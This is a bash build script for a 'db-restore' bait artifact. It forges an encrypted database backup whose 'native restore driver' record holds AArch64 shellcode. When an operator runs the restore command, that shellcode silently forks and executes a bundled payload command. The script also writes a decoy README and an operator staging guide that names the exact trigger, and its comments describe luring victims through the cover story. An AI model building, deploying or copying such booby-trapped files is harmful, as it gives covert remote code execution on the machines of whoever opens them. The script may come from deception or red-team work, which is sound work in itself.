#!/usr/bin/env bash
# db-restore staging vessel — wrap the bundled payload in a "DBK v4 encrypted-backup
# restore tool" RCE delivery artifact.
#
# Cover story: `db-restore` is the decrypt/restore utility for a CI pipeline's nightly
# database backups (`*.dbk`, AEAD-encrypted TLV containers). The artifact ships the real,
# working binary plus one forged backup and a restore runbook. An operator who finds the
# bundle runs `db-restore info` / `list` (genuine, read-only recon that prints a convincing
# prod snapshot and service-account DSNs), then the obvious next step — `db-restore restore
# <backup>.dbk` — which decrypts and materialises the dump *and*, as an invisible background
# side effect, executes the embedded SDK payload. A genuine backup would just decrypt.
#
# Mechanism: the backup body carries a "native restore driver" TLV record whose bytes the
# binary maps PROT_READ|PROT_EXEC and calls through a function pointer. Those bytes are
# AArch64 position-independent shellcode that clone()s and execve("/bin/sh","-c",CMD) in the
# child while the parent returns normally and prints the decoy SQL. CMD is the bundled
# payload's one-liner. The body is XChaCha20-Poly1305 AEAD-locked under a key derived (Argon2i)
# from a build-time secret baked into the binary and the per-backup salt — anyone holding the
# binary can re-derive that key and forge a valid backup, which is exactly what this vessel does.
#
# ── target_arch: aarch64-linux ONLY ──────────────────────────────────────────────────────
# The shipped `db-restore` is a static ARM64 Linux ELF, and the planted native-driver payload
# is AArch64 machine code that issues Linux syscalls directly (clone=220, execve=221 via
# `svc #0`). Neither is portable to another ISA or OS — an x86-64 binary would need different
# shellcode, and a macOS/Windows target would need a different syscall ABI entirely. So this
# vessel supports exactly one target and hard-fails any other (docs/bait-authoring.md §5's
# "fail fast on unsupported targets" rule). An empty/omitted target_arch resolves to
# aarch64-linux (the only thing it can build), never a silent multi-arch attempt.
#
# ── the binary is command-independent; only the backup is forged per build ────────────────
# CMD lives solely in the `.dbk` body, never in the ELF (the binary only carries the fixed
# build secret used to unlock backups). So the binary is a constant cover artifact, shipped
# prebuilt in src/db-restore, and setup.sh forges only a fresh backup each build. That also
# means this vessel needs no ARM64 cross-toolchain and no Docker on the build host — just a
# host C compiler (to build a host-native monocypher for the forge-side crypto) and python3.
#
# ── determinism ──────────────────────────────────────────────────────────────────────────
# The forged backup is byte-reproducible: its per-backup salt is derived from context.json's
# `seed` (not os.urandom), so identical context.json -> identical `.dbk` (docs/bait-authoring.md
# §5 rule 3). The prebuilt binary and the staged docs are static. No network access at build
# time (§5 rule 5).

set -euo pipefail

CONTEXT_JSON="${1:?usage: setup.sh <context.json>}"

# Parse context.json (Python one-liner — no jq dependency, matches the other vessels).
cj() { python3 -c "import json,sys; print(json.load(open('$CONTEXT_JSON')).get(sys.argv[1],''))" "$1"; }
BUNDLING_OUTPUTS=$(cj bundling_outputs_dir)
OUTPUT=$(cj output_dir)
OUTPUT_ROOT=$(cj output_dir_root)
SEED=$(cj seed)

VESSEL_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="$VESSEL_DIR/src"

# Scratch space for the host-native monocypher build — not part of the declared artifact;
# cleaned up on exit regardless of success/failure so nothing leaks into src/ or to_stage/.
SCRATCH="$(mktemp -d)"
trap 'rm -rf "$SCRATCH"' EXIT

# ---- resolve target_arch: aarch64-linux only -------------------------------------------
WANTED_ARCHES=()
while IFS= read -r a; do
    [[ -n "$a" ]] && WANTED_ARCHES+=("$a")
done < <(python3 -c "
import json
c = json.load(open('$CONTEXT_JSON'))
for a in (c.get('target_arch') or []):
    print(a)
")

for w in "${WANTED_ARCHES[@]-}"; do
    [[ -z "$w" ]] && continue
    if [[ "$w" != "aarch64-linux" ]]; then
        echo "error: unsupported target_arch '$w' — the db-restore vessel supports only aarch64-linux." >&2
        echo "The shipped binary is a static ARM64 Linux ELF and the planted native-driver payload is" >&2
        echo "AArch64 Linux shellcode; no other architecture or OS is buildable from this vessel." >&2
        exit 1
    fi
done
if [[ ${#WANTED_ARCHES[@]} -eq 0 ]]; then
    echo "building db-restore: aarch64-linux (target_arch empty -> the only target this vessel produces)" >&2
else
    echo "building db-restore: aarch64-linux" >&2
fi

PREBUILT_BIN="$SRC_DIR/db-restore"
if [[ ! -f "$PREBUILT_BIN" ]]; then
    echo "error: prebuilt ARM64 binary missing at $PREBUILT_BIN" >&2
    exit 1
fi

# ---- build a host-native monocypher shared library for the forge-side crypto -----------
# gen_dbk.py drives the same Argon2i/Blake2b/AEAD primitives the binary uses, via ctypes.
# The checked-in binary is ARM64 Linux and can't be dlopen()'d by this host's Python, so
# compile monocypher.c natively here. Monocypher is deterministic portable C — a host-built
# copy produces byte-identical key/nonce/ciphertext to the ARM64 binary's own linked copy,
# so the backup it forges decrypts correctly on the target (verified end-to-end in e2e).
CC="${CC:-cc}"
echo "== building host-native monocypher ($CC) ==" >&2
"$CC" -O2 -shared -fPIC -I"$SRC_DIR" -o "$SCRATCH/monocypher.so" "$SRC_DIR/monocypher.c"
export DBK_MONOCYPHER_SO="$SCRATCH/monocypher.so"

# ---- deterministic per-backup salt from the build seed ---------------------------------
SALT_HEX=$(python3 -c "
import hashlib, sys
seed = sys.argv[1]
print(hashlib.sha256(('db-restore-dbk-salt|' + seed).encode()).hexdigest())
" "$SEED")

# ---- forge the malicious backup --------------------------------------------------------
# The command executed by the native-driver shellcode is the bundler's pre-generated
# one-liner (never hand-rolled — docs/bait-authoring.md §5). The snapshot metadata matches
# the prod fixture so `info`/`list` read as a genuine backup.
PAYLOAD_CMD=$(cat "$BUNDLING_OUTPUTS/ready_for_vessel.txt")
DBK_NAME="prod-nightly-2026-06-14.dbk"

echo "== forging $DBK_NAME (native-driver payload = bundled SDK command) ==" >&2
python3 "$SRC_DIR/forge/gen_dbk.py" \
    --cmd "$PAYLOAD_CMD" \
    --source "app@prod-pg-01" \
    --ts "2026-06-14T03:11:07Z" \
    --tables 14 --rows 182431 \
    --salt "$SALT_HEX" \
    --out "$OUTPUT/$DBK_NAME" >&2

# ---- stage the cover binary + docs -----------------------------------------------------
cp "$PREBUILT_BIN" "$OUTPUT/db-restore"
chmod +x "$OUTPUT/db-restore"

# Restore runbook — genuine operator doc (points at the restore command = the trigger, which
# is exactly the enticement we want). Staged verbatim from the real project; no CMD hints.
mkdir -p "$OUTPUT/docs"
cp "$SRC_DIR/docs/restore-runbook.md" "$OUTPUT/docs/restore-runbook.md"

# A short, real-looking project README (the genuine dbops description, minus any
# fixture-generation tooling that would hint at the planted command).
cat > "$OUTPUT/README.md" <<'EOF'
# db-restore

**db-restore** decrypts and materialises DBK v4 encrypted database backups produced by the
`dbops` nightly CI pipeline. Each build emits a paired `db-restore` binary and one or more
`.dbk` files; the binary carries a build-time key that, combined with the per-backup salt in
the header, unlocks the AEAD-encrypted body.

Build: **dbops 4.2.1** · commit `7d2e9c4` · 2026-06-10

## Usage

```
db-restore info    <backup.dbk>
db-restore list    <backup.dbk>
db-restore restore <backup.dbk> [--out PATH] [--table NAME] [--limit N] [--format sql|csv|json]
db-restore verify  <backup.dbk>
```

| Subcommand | Description |
|------------|-------------|
| `info`     | Print plaintext header fields and verify the AEAD tag |
| `list`     | List table names and row counts |
| `restore`  | Decrypt and emit the full dump (default: SQL to stdout, capped at 20 rows) |
| `verify`   | Check AEAD tag only; exit 0 if valid, 5 if corrupt |

The binary and the `.dbk` from a given build are paired: the key embedded at compile time
matches only the backups produced by the same pipeline run. Using a mismatched build produces
exit code 5.

## Crypto

| Component | Algorithm |
|-----------|-----------|
| KDF       | Argon2i |
| AEAD      | XChaCha20-Poly1305 |

Implemented via the bundled [Monocypher](https://monocypher.org/) library (public domain).
EOF

# ---- artifact.json (root, not to_stage/) -----------------------------------------------
python3 - "$OUTPUT_ROOT/artifact.json" "$DBK_NAME" <<'EOF'
import json, sys
artifact_path, dbk_name = sys.argv[1:]
files = {
    "db-restore":              {"role": "binary"},
    dbk_name:                  {"role": "config"},
    "README.md":               {"role": "doc"},
    "docs/restore-runbook.md": {"role": "doc"},
}
with open(artifact_path, "w") as f:
    json.dump({"primary": "db-restore", "files": files}, f, indent=2)
    f.write("\n")
EOF

# ---- how_to_stage.md (root, operator-only — never staged into to_stage/) ----------------
cat > "$OUTPUT_ROOT/how_to_stage.md" <<EOF
# How to stage this bait

## What this is
A real, working \`db-restore\` — the decrypt tool for a CI pipeline's nightly database backups
— plus one forged backup (\`$DBK_NAME\`) and its restore runbook. Running \`info\`/\`list\`/\`verify\`
on the backup is genuine, harmless recon that shows a convincing prod snapshot and service-account
DSNs. Running \`restore\` decrypts the dump **and** fires the bundled SDK payload as an invisible
background side effect (a planted "native restore driver" in the backup body). A genuine backup
would decrypt without side effects.

## How to stage it
Copy \`db-restore\`, \`$DBK_NAME\`, \`README.md\` and \`docs/restore-runbook.md\` onto the target,
preserving the \`docs/\` path. Make the binary executable (\`chmod +x db-restore\`). Target must be
**ARM64 Linux** (the binary is a static aarch64 ELF). The README and runbook are cover — leave them
in place; the runbook nudges the reader toward the \`restore\` command.

## Exact trigger command
\`\`\`
./db-restore restore $DBK_NAME --table service_accounts
\`\`\`
(any \`restore\` invocation on this backup triggers it; \`info\`/\`list\`/\`verify\` do not. The
payload runs in a forked child, so allow ~1s after the command returns for it to complete.)
EOF

echo "staged: db-restore + $DBK_NAME (RCE-armed backup) + README.md + docs/restore-runbook.md" >&2
